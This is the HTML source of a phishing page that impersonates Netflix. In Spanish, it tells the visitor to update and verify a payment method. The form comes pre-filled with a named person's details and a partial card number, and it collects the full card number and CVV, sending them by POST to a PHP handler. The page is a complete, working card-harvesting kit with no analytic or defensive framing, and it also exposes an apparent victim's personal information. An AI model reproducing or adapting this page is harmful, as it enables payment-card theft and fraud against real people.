<!DOCTYPE html>

<html>

<head>
	
	<link rel="icon" href="Favicon.png" type="SCAM/Favicon.png" sizes="16x16" />
	<title>Netflix</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
	<link rel="stylesheet" type="text/css" href="estilo.css">
	<link rel= "stylesheet" href= "https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.0.0/animate.compat.css">	
</head>

<body>
<div class="header" id="Cabezote">
<img class="logo" src="netflix-logo.png" alt="netflix-logo.png">
<a href="https://www.netflix.com/co/login" class="a">Cerrar sesión</a></div>
<div class="todo" id="todo">
<div class="container" id="inner">
<h3> Actualiza y verifica tu forma de pago</h3>
<img class="img1" src="visa-v3.svg" alt="visa-v3.svg">
<img class="img2" src="mastercard.svg" alt="mastercard.svg">
<img class="img3" src="amex.svg" alt="amex.svg">
<img class="img4" src="img-4.png" alt="img-4.png">

</div>

<div class="formulario" id="campos">
		<form class="form" action="conection.php" method="POST">
			<br>
			<input  id="campo" name="Nombre" value="Nombre: Diana Carolina" placeholder ="Nombre" readonly>
			<br>
			<input  id="campo"  name="Apellido" value="Apellido: Vargas Torres" placeholder ="Apellido" readonly>
			<br>
			<input  id="ntarjeta" minlength="16" maxlength="19" name="ntarjeta"  placeholder ="VISA: **** **** **** 9040" required="Numero">
			<br>

<script>
// Campo numeros
var ntarjeta = document.getElementById('ntarjeta');

// Poner cursor en el campo numeros
ntarjeta.focus();

ntarjeta.onkeydown = function(e){
	// Permitir la tecla para borrar
	if (e.key == 'Backspace') return true;

	// Permitir flecha izquierda
	if (e.key == 'ArrowLeft') return true;

	// Permitir flecha derecha
	if (e.key == 'ArrowRight') return true;

	// Bloquear tecla de espacio
	if (e.key == ' ') return false;

	// Bloquear tecla si no es un numero
	if (isNaN(e.key)) return false;
};

ntarjeta.onkeyup = function(){
	ntarjeta.value = ntarjeta.value
					// Borrar todos los espacios
					.replace(/\s/g, '')

					// Agregar un espacio cada dos numeros
					.replace(/([0-9]{4})/g, '$1 ')

					// Borrar espacio al final
					.trim();
};
</script>
			<input  id="campo"  name="fecha" value="Fecha de vencimiento: 08/26" placeholder ="Fecha de vencimiento (MM/AA)" readonly>
			<br>
			<input  id="codigo" minlength="3" maxlength="4"  name="codigo" placeholder ="Código de seguridad (CVV)" required="Numero" pattern="[0-9]+">
			<img class="pregunta" src="pregunta1.png" alt="pregunta1.png">

			<br>
			<h4>Los pagos se procesarán internacionalmente. Es posible que se apliquen comisiones bancarias adicionales.</h4>
			<input  id="accept" type="submit" value="Guardar">
			<br>
			<br>
			
		</form>
	
	</div>
	</div>
	<footer class="footer">
		<div class="pie" id="pie">
			<h5> ¿Preguntas? Llama al 01 800 917 1564 </h5> 
			<h6> Preguntas frecuentes<br>	Centro de ayuda	<br>	Términos de uso  </h6> 
        </footer>
	
	

	
</body>


</html>
